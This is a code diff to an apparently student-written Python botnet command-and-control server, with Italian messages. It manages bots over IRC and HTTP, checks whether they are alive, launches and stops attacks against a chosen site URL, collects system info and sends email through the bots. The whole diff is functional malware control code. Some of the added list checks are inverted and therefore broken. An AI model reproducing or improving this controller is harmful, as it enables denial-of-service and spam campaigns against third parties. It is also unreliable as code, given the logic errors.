@@ -17,15 +17,19 @@ def readMessage(s):
     buff = s.recv(2048).decode("UTF-8")
     message = buff.split("\r\n")
     for m in message:
-        print(m)
         if m.startswith("PING"):
             sendMessage(s, "PONG :botnet.sicurezza.com")
-        if m.startswith("bot-"):
+        if m.startswith(":bot-"):
             if "PONG" in m:
                 return True
             comando = m[m.index(":#botnet: ") + 10::]
             comando = comando.strip("[]").split("|")
-            return comando
+            print(comando)
+            if "{" not in comando[1] and "}" not in comando[1]:
+                return comando
+            else:
+                return comando[1]
+
 
 def irc():
     NICKNAME = "cc"
@@ -33,6 +37,7 @@ def irc():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(("127.0.0.1", 6697))
+        s.settimeout(5)
         s.send(bytes(f"NICK {NICKNAME}\r\n", "UTF-8"))
         s.send(bytes(f"USER {NICKNAME} {NICKNAME} {NICKNAME} :{NICKNAME}:\r\n", "UTF-8"))
         sendMessage(s, f"JOIN {CHANNEL}:\r\n")
@@ -42,6 +47,11 @@ def irc():
     except Exception as e:
         print("IRC error:", e)
         return None
+
+
+def closeIrc(s):
+    if s is not None:
+        s.close()
 
 
 class CC:
@@ -93,7 +103,6 @@ class CC:
             s.close()
 
     def checkBot(self):
-        print("Controllo bot attivi...")
         rm = []
         for k, v in self.activeBot.items():
             if 'http' in self.activeBot[k]:
@@ -102,28 +111,28 @@ class CC:
                     response = requests.get(url, timeout=10)
                     res = response.json()
                 except Exception as e:
-                    print(k, " is not reachable over http port.")
+                    print(k, "is not reachable over http port.")
                     del self.activeBot[k]['http']
 
             if 'irc' in self.activeBot[k]:
-                s = irc()
-                if s is None:
-                    print("IRC connection error")
-                    return
-                sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: PING")
-                sleep(1)
-                m = readMessage(s)
-                if not m:
-                    print("Impossibile inviare la richiesta a", k)
+                try:
+                    s = irc()
+                    if s is None:
+                        print("IRC connection error")
+                        return
+                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: PING")
+                    sleep(1)
+                    m = readMessage(s)
+                    if "PONG" not in m:
+                        print(k, "is not reachable over irc port.")
+                        del self.activeBot[k]['irc']
+                except Exception as e:
+                    print(k, "is not reachable over irc port.")
                     del self.activeBot[k]['irc']
-
             if len(self.activeBot[k]) == 2:
                 rm.append(k)
-
-
         for k in rm:
             del self.activeBot[k]
-        print("Controllo terminato")
 
     def makeHTTPRequest(self, server, time=1, target=""):
         print("Invio richiesta...")
@@ -261,6 +270,7 @@ class CC:
                 self.activeBot[target]["action"] = res[1]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
+        closeIrc(s)
 
     def stopIRCAttack(self, target=""):
         s = irc()
@@ -286,6 +296,7 @@ class CC:
                 self.activeBot[target]["action"] = res[1]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
+        closeIrc(s)
 
     def getIRCSystemInfo(self, target=""):
         s = irc()
@@ -313,6 +324,7 @@ class CC:
                 readMessage(s)
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
+        closeIrc(s)
 
     def sendIRCEmail(self, target=""):
         users = None
@@ -353,6 +365,7 @@ class CC:
                 self.activeBot[target]["action"] = res[1]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
+        closeIrc(s)
 
     def command(self, event):
         sleep(1)
@@ -367,16 +380,17 @@ class CC:
                   "\t7) Check bot service\n"
                   "\t8) Stop CC\n")
             comando = input("C&C@command: ")
-            #Ferma il server
             match int(comando):
                 case 1:
                     print("Ip\t\thttp\t\tirc")
-                    for k, v in self.activeBot.items():
-                        print(f"{k}\t{v['http']}\t\t{v['irc']}")
+                    if not self.activeBot:
+                        for k, v in self.activeBot.items():
+                            print(f"{k}\t{v['http']}\t\t{v['irc']}")
                 case 2:
-                    print("Ip\t\thttp\t\tirc\t\ttarget\t\t\t\taction")
-                    for k, v in self.activeBot.items():
-                        print(f"{k}\t{v['http']}\t\t{v['irc']}\t\t{v['target']}\t\t{v['action']}")
+                    print("Ip\t\thttp\t\tirc\t\ttarget\t\taction")
+                    if not self.activeBot:
+                        for k, v in self.activeBot.items():
+                            print(f"{k}\t{v['http']}\t\t{v['irc']}\t\t{v['target']}\t\t{v['action']}")
                 case 3:
                     service = input("Select type of attack(1=HTTP, 2=IRC): ")
                     site = input("Enter site url: ")
